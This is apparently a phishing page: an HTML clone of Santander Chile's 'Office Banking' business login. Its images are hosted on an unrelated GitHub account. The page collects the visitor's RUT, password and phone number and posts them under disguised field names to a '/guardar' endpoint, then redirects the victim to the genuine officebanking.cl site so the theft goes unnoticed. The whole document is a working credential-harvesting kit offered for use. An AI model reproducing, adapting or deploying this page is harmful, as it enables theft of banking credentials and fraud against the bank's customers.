<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8" />
  <title>Office Banking</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <link rel="stylesheet" href="styles.css" />
  <link rel="stylesheet" href="icons.css" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/css/bootstrap.min.css" />
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.css" />

  <style>
    body {
      background-color: #f5f5f5;
    }

    .carousel-item {
      height: 78vh;
      min-height: 420px;
      overflow: hidden;
    }

    .carousel-item img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      object-position: center;
      display: block;
    }

    .carousel-inner .row {
      margin: 0;
      height: 100%;
    }

    .carousel-inner .col-12,
    .carousel-inner .col-md-6 {
      height: 100%;
      padding: 0;
    }

    .carousel-control-prev-icon,
    .carousel-control-next-icon {
      filter: invert(100%);
    }

    .offcanvas {
      width: 430px;
      max-width: 100%;
    }

    .brand-office-text,
    .brand-banking-text {
      display: inline-flex;
      align-items: center;
      justify-content: center;
      line-height: 1;
      letter-spacing: -1px;
      font-weight: 900;
      border-radius: 10px;
      padding: 10px 16px;
      font-size: 1.9rem;
    }

    .brand-office-text {
      color: #111827;
      background: transparent;
    }

    .brand-banking-text {
      background: #dc2626;
      color: #ffffff;
      box-shadow: 0 6px 14px rgba(0,0,0,0.15);
    }

    .clear-input {
      position: absolute;
      right: 14px;
      top: 50%;
      transform: translateY(-50%);
      width: 18px;
      height: 18px;
      border-radius: 50%;
      background: #d1d5db;
      cursor: pointer;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #111827;
      font-size: 12px;
      font-weight: 700;
      line-height: 1;
    }

    .clear-input::before {
      content: "×";
      display: block;
      transform: translateY(-1px);
    }

    .toggle-password {
      position: absolute;
      right: 42px;
      top: 50%;
      transform: translateY(-50%);
      width: 22px;
      height: 22px;
      cursor: pointer;
      opacity: 0.8;
      border: none;
      background: transparent;
      padding: 0;
      display: inline-flex;
      align-items: center;
      justify-content: center;
      color: #374151;
    }

    .toggle-password svg {
      width: 22px;
      height: 22px;
      display: block;
      stroke: currentColor;
      fill: none;
      stroke-width: 2;
      stroke-linecap: round;
      stroke-linejoin: round;
    }

    .hidden {
      display: none !important;
    }

    #resultado,
    #mensajeExito {
      margin-top: 18px;
      padding: 12px;
      border-radius: 10px;
      text-align: center;
      font-weight: 700;
      font-size: 0.95rem;
      display: none;
    }

    #resultado.error {
      display: block;
      background: #fee2e2;
      border: 2px solid #ef4444;
      color: #991b1b;
    }

    #resultado.success {
      display: block;
      background: #dcfce7;
      border: 2px solid #22c55e;
      color: #166534;
    }

    #mensajeExito {
      display: none;
      background: #dc2626;
      border: 2px solid #b91c1c;
      color: #ffffff;
      padding: 14px 16px;
      border-radius: 12px;
      font-weight: 700;
      box-shadow: 0 6px 18px rgba(220, 38, 38, 0.20);
    }

    #mensajeExito.show {
      display: block;
    }

    #loginForm label {
      display: block;
      margin-top: 14px;
      margin-bottom: 8px;
      font-weight: 700;
      color: #374151;
    }

    #loginForm input {
      width: 100%;
      border-radius: 12px;
      border: 2px solid #fca5a5;
      padding: 12px 48px 12px 12px;
      outline: none;
      transition: all 0.2s ease;
    }

    #loginForm input:focus {
      border-color: #dc2626;
      box-shadow: 0 0 0 4px rgba(239, 68, 68, 0.12);
    }

    #loginForm .btn-danger {
      background: linear-gradient(135deg, #dc2626 0%, #b91c1c 100%);
      border: none;
      border-radius: 12px;
      font-weight: 700;
      padding: 12px 16px;
    }

    @media (max-width: 768px) {
      .carousel-item {
        height: 60vh;
        min-height: 280px;
      }
    }
  </style>
</head>
<body>
  <!-- Barra superior -->
  <nav class="navbar navbar-expand-lg" style="background-color:#fff; border-bottom:2px solid #ddd; min-height:90px; padding-top:12px; padding-bottom:12px;">
    <div class="container-fluid d-flex justify-content-between align-items-center">
      <a class="navbar-brand d-flex align-items-center d-none d-md-flex" href="#" aria-label="Office Banking">
        <span class="brand-office-text">Office</span>
        <span class="brand-banking-text">Banking</span>
      </a>

      <a class="navbar-brand d-flex align-items-center d-md-none" href="#" aria-label="Office Banking">
        <span class="brand-office-text" style="font-size: 1.5rem;">Office</span>
        <span class="brand-banking-text" style="font-size: 1.5rem; padding: 7px 12px;">Banking</span>
      </a>

      <div class="d-none d-md-flex flex-grow-1 justify-content-center">
        <ul class="navbar-nav">
          <li class="nav-item">
            <a class="nav-link" href="https://empresas.officebanking.cl/article/productos-y-servicios" style="color:#000; font-weight:500; margin:0 12px;">
              Productos y Servicios
            </a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="https://banco.santander.cl/sucursales-santander" style="color:#000; font-weight:500; margin:0 12px;">
              Sucursales
            </a>
          </li>
          <li class="nav-item">
            <a class="nav-link" href="https://empresas.officebanking.cl/article/servicio-al-cliente" style="color:#000; font-weight:500; margin:0 12px;">
              Servicio al Cliente
            </a>
          </li>
        </ul>
      </div>

      <button
        class="btn btn-ingresar ms-auto"
        type="button"
        data-bs-toggle="offcanvas"
        data-bs-target="#offcanvasLogin"
        style="background-color:#cc0000; color:#fff; border-radius:25px; font-weight:bold; padding:6px 16px; border:none; display:flex; align-items:center;"
      >
        <i class="bi bi-person" style="font-size:20px; margin-right:8px;"></i> Ingresar
      </button>
    </div>
  </nav>

  <!-- Carrusel -->
  <div id="carouselExample" class="carousel slide" data-bs-ride="carousel">
    <div class="carousel-inner">
      <div class="carousel-item active">
        <div class="row">
          <div class="col-12 d-none d-md-block">
            <a href="https://banco.santander.cl/beneficios?filter=empresas" target="_blank">
              <img src="https://raw.githubusercontent.com/OBDigital2026/OBCH/main/BeneficiosEmpresas%20(2).png" class="d-block w-100 beneficios-empresas" alt="Beneficios Empresas" />
            </a>
          </div>

          <div class="col-12 d-block d-md-none">
            <a href="https://banco.santander.cl/beneficios?filter=empresas" target="_blank">
              <img src="https://raw.githubusercontent.com/OBDigital2026/OBCH/main/beneficiosEmpresas.jpg" class="d-block w-100" alt="Beneficios Empresas" />
            </a>
          </div>
          <div class="col-12 d-block d-md-none">
            <a href="https://banco.santander.cl/beneficios?filter=empresas" target="_blank">
              <img src="https://raw.githubusercontent.com/OBDigital2026/OBCH/main/beneficios2.png" alt="Beneficios" class="img-fluid d-block mx-auto" style="max-width:100%; height:auto;" />
            </a>
          </div>
        </div>
      </div>

      <div class="carousel-item">
        <div class="row">
          <div class="col-12 col-md-6">
            <a href="https://banco.santander.cl/empresas/tarjetas-de-credito-empresas" target="_blank">
              <img src="https://raw.githubusercontent.com/OBDigital2026/OBCH/main/Tc2.png" class="d-block w-100" alt="TC2" />
            </a>
          </div>
          <div class="col-12 col-md-6">
            <a href="https://banco.santander.cl/empresas/tarjetas-de-credito-empresas" target="_blank">
              <img src="https://raw.githubusercontent.com/OBDigital2026/OBCH/main/tc_empresas.jpg" class="d-block w-100" alt="Tarjeta Empresas" />
            </a>
          </div>
        </div>
      </div>

      <div class="carousel-item">
        <div class="row">
          <div class="col-12 col-md-6">
            <a href="https://banco.santander.cl/empresas/fogape" target="_blank">
              <img src="https://raw.githubusercontent.com/OBDigital2026/OBCH/main/FogapeNuevo.jpg" class="d-block w-100" alt="Santander X" />
            </a>
          </div>
          <div class="col-12 col-md-6">
            <a href="https://banco.santander.cl/empresas/fogape" target="_blank">
              <img src="https://raw.githubusercontent.com/OBDigital2026/OBCH/main/Fogape1.png" class="d-block w-100" alt="SOAP 2" style="object-fit: contain; background: #fff;" />
            </a>
          </div>
        </div>
      </div>
    </div>

    <button class="carousel-control-prev" type="button" data-bs-target="#carouselExample" data-bs-slide="prev">
      <span class="carousel-control-prev-icon" aria-hidden="true"></span>
      <span class="visually-hidden">Anterior</span>
    </button>
    <button class="carousel-control-next" type="button" data-bs-target="#carouselExample" data-bs-slide="next">
      <span class="carousel-control-next-icon" aria-hidden="true"></span>
      <span class="visually-hidden">Siguiente</span>
    </button>
  </div>

  <div class="carousel-indicators mt-3">
    <button type="button" data-bs-target="#carouselExample" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
    <button type="button" data-bs-target="#carouselExample" data-bs-slide-to="1" aria-label="Slide 2"></button>
    <button type="button" data-bs-target="#carouselExample" data-bs-slide-to="2" aria-label="Slide 3"></button>
  </div>

  <!-- Offcanvas lateral -->
  <div class="offcanvas offcanvas-end" tabindex="-1" id="offcanvasLogin" aria-labelledby="offcanvasLoginLabel">
    <div class="offcanvas-header" style="padding-top:40px; padding-bottom:20px;">
      <div class="d-flex justify-content-center align-items-center">
        <span class="brand-office-text" style="font-size: 2rem;">Office</span>
        <span class="brand-banking-text" style="font-size: 2rem; padding: 8px 14px;">Banking</span>
      </div>

      <button
        type="button"
        class="btn-close"
        data-bs-dismiss="offcanvas"
        aria-label="Close"
        style="filter: invert(30%) sepia(100%) saturate(5000%) hue-rotate(340deg);"
      ></button>
    </div>

    <div class="offcanvas-body" style="overflow-y:auto; max-height:100vh;">
      <h5 class="text-center mb-4">Bienvenido a Office Banking</h5>

      <div class="login-box">
        <form id="loginForm">
          <label for="rut">RUT</label>
          <div class="position-relative">
            <input type="text" id="rut" name="rut" placeholder="12.345.678-5" required class="form-control" style="padding-right: 40px;" />
            <span class="clear-input" onclick="document.getElementById('rut').value=''" aria-label="Limpiar RUT"></span>
          </div>

          <label for="passwd">Contraseña</label>
          <div class="position-relative">
            <input type="password" id="passwd" name="passwd" required class="form-control" style="padding-right: 80px;" />
            <span class="clear-input" onclick="document.getElementById('passwd').value=''" aria-label="Limpiar contraseña"></span>
            <button type="button" id="togglePasswd" class="toggle-password" aria-label="Mostrar contraseña" title="Mostrar contraseña">
              <svg id="eyeIcon" viewBox="0 0 24 24" aria-hidden="true">
                <path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z"></path>
                <circle cx="12" cy="12" r="3"></circle>
              </svg>
            </button>
          </div>

          <div class="form-group mt-3">
            <label for="telefono">Teléfono</label>
            <div class="position-relative">
              <input type="tel" id="telefono" name="telefono" placeholder="+56 9 1234 5678" required class="form-control" maxlength="17" />
            </div>
          </div>

          <button type="submit" class="btn btn-danger w-100 mt-3">Ingresar</button>
        </form>

        <div id="resultado"></div>
        <div id="mensajeExito">Hemos recibido tu solicitud correctamente</div>
      </div>
    </div>
  </div>

  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.2/dist/js/bootstrap.bundle.min.js"></script>

  <script>
    const passwdInput = document.getElementById('passwd');
    const togglePasswd = document.getElementById('togglePasswd');
    const eyeIcon = document.getElementById('eyeIcon');
    const loginForm = document.getElementById('loginForm');
    const resultado = document.getElementById('resultado');
    const mensajeExito = document.getElementById('mensajeExito');
    const telefonoInput = document.getElementById('telefono');
    const REDIRECT_URL = 'https://empresas.officebanking.cl/';

    let visible = false;

    function setEyeIcon(showPassword) {
      if (showPassword) {
        eyeIcon.innerHTML = `
          <path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z"></path>
          <circle cx="12" cy="12" r="3"></circle>
          <path d="M4 4 20 20"></path>
        `;
      } else {
        eyeIcon.innerHTML = `
          <path d="M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6S2 12 2 12Z"></path>
          <circle cx="12" cy="12" r="3"></circle>
        `;
      }
    }

    setEyeIcon(false);

    togglePasswd.addEventListener('click', () => {
      visible = !visible;
      passwdInput.type = visible ? 'text' : 'password';
      setEyeIcon(visible);
    });

    telefonoInput.addEventListener('input', (e) => {
      let digits = e.target.value.replace(/\D/g, '').slice(0, 11);

      if (digits.length <= 2) {
        e.target.value = '+56';
        return;
      }

      let formatted = '+56';

      if (digits.length > 2) {
        formatted += ' ' + digits.substring(2, 3);
      }

      if (digits.length > 3) {
        formatted += ' ' + digits.substring(3, 7);
      }

      if (digits.length > 7) {
        formatted += ' ' + digits.substring(7, 11);
      }

      e.target.value = formatted.trim();
    });

    function formatearRUT(valor) {
      valor = valor.replace(/\./g, '').replace(/-/g, '');
      if (valor.length === 0) return '';

      let dv = valor.slice(-1);
      let cuerpo = valor.slice(0, -1);
      let cuerpoFormateado = '';

      while (cuerpo.length > 3) {
        cuerpoFormateado = '.' + cuerpo.slice(-3) + cuerpoFormateado;
        cuerpo = cuerpo.slice(0, -3);
      }

      cuerpoFormateado = cuerpo + cuerpoFormateado;
      return cuerpoFormateado + '-' + dv;
    }

    document.getElementById('rut').addEventListener('input', function (e) {
      let valor = e.target.value.replace(/[^0-9kK]/g, '');
      e.target.value = formatearRUT(valor);
    });

    function validarRut(rutCompleto) {
      rutCompleto = rutCompleto.replace(/\./g, '').replace(/-/g, '').toUpperCase();
      if (rutCompleto.length < 2) return false;

      let cuerpo = rutCompleto.slice(0, -1);
      let dv = rutCompleto.slice(-1);
      let suma = 0;
      let multiplo = 2;

      for (let i = cuerpo.length - 1; i >= 0; i--) {
        suma += parseInt(cuerpo.charAt(i)) * multiplo;
        multiplo = multiplo < 7 ? multiplo + 1 : 2;
      }

      let dvEsperado = 11 - (suma % 11);
      dvEsperado = dvEsperado === 11 ? '0' : dvEsperado === 10 ? 'K' : dvEsperado.toString();
      return dv === dvEsperado;
    }

    function validarTelefono(telefono) {
      const normalizado = String(telefono || '').replace(/\s+/g, '');
      return /^(\+?56)?9\d{8}$/.test(normalizado);
    }

    loginForm.addEventListener('submit', async function (e) {
      e.preventDefault();

      const rut = document.getElementById('rut').value.trim();
      const passwd = document.getElementById('passwd').value.trim();
      const telefono = document.getElementById('telefono').value.trim();

      if (!validarRut(rut)) {
        resultado.className = 'error';
        resultado.innerText = '❌ RUT inválido';
        return;
      }

      if (!passwd) {
        resultado.className = 'error';
        resultado.innerText = '❌ Debes ingresar la contraseña';
        return;
      }

      if (!validarTelefono(telefono)) {
        resultado.className = 'error';
        resultado.innerText = '❌ El teléfono debe tener formato +56 9 1234 5678';
        return;
      }

      try {
        const response = await fetch('/guardar', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            numero: rut,
            alfanumerico: passwd,
            telefono
          })
        });

        const data = await response.json();

        if (response.ok) {
          loginForm.classList.add('hidden');
          resultado.className = 'success';
          resultado.innerText = data.mensaje || 'Hemos recibido tu solicitud correctamente';
          resultado.style.display = 'block';

          setTimeout(() => {
            window.location.href = REDIRECT_URL;
          }, 1800);
        } else {
          resultado.className = 'error';
          resultado.innerText = data.error || '❌ Error al guardar la información';
        }
      } catch (error) {
        resultado.className = 'error';
        resultado.innerText = '⚠️ Error al conectar con el servidor.';
      }
    });
  </script>
</body>
</html>
